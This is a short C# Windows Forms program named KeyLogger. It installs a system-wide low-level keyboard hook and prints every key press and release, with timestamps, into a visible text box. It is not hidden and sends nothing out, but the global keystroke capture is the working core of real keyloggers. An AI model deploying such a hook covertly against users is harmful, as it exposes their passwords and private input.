using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace KeyLogger;

public class Program
{
    [DllImport("user32.dll")]
    public static extern nint SetWindowsHookEx(int idHook, HookCallbackDelegate lpfn, nint wParam, uint lParam);
    [DllImport("kernel32.dll")]
    public static extern nint GetModuleHandle(string lpModuleName);
    [DllImport("user32.dll")]
    public static extern nint CallNextHookEx(nint hhk, int nCode, nint wParam, nint lParam);

    private static int WH_KEYBOARD_LL = 13;
    private static int WM_KEYDOWN = 0x100;
    private static int WM_KEYUP = 0x0101;

    private static TextBox outputTextBox;

    public static void Main(string[] args)
    {
        ApplicationConfiguration.Initialize();
        Form1 form = new Form1();
        outputTextBox = form.OutputTextBox;

        // Redirect console output to the TextBox
        TextBoxWriter writer = new TextBoxWriter(outputTextBox);
        Console.SetOut(writer);

        HookCallbackDelegate hcDelegate = HookCallback;

        string mainModuleName = Process.GetCurrentProcess().MainModule.ModuleName;
        nint hook = SetWindowsHookEx(WH_KEYBOARD_LL, hcDelegate, GetModuleHandle(mainModuleName), 0);

        Application.Run(form);
    }

    public static nint HookCallback(int nCode, nint wParam, nint lParam)
    {
        if (nCode >= 0)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            string timeStamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.f");

            if (wParam == WM_KEYDOWN)
            {
                Console.WriteLine($"{timeStamp} - [KeyDown: {(Keys)vkCode}]");
            }
            else if (wParam == WM_KEYUP)
            {
                Console.WriteLine($"{timeStamp} - [KeyUp: {(Keys)vkCode}]");
            }
        }
        return CallNextHookEx(nint.Zero, nCode, wParam, lParam);
    }

    public delegate nint HookCallbackDelegate(int nCode, nint wParam, nint lParam);
}

public class TextBoxWriter : TextWriter
{
    private readonly TextBox _textBox;

    public TextBoxWriter(TextBox textBox)
    {
        _textBox = textBox;
    }

    public override void Write(char value)
    {
        _textBox.Invoke((Action)(() => _textBox.AppendText(value.ToString())));
    }

    public override void Write(string value)
    {
        _textBox.Invoke((Action)(() => _textBox.AppendText(value)));
    }

    public override Encoding Encoding => Encoding.UTF8;
}
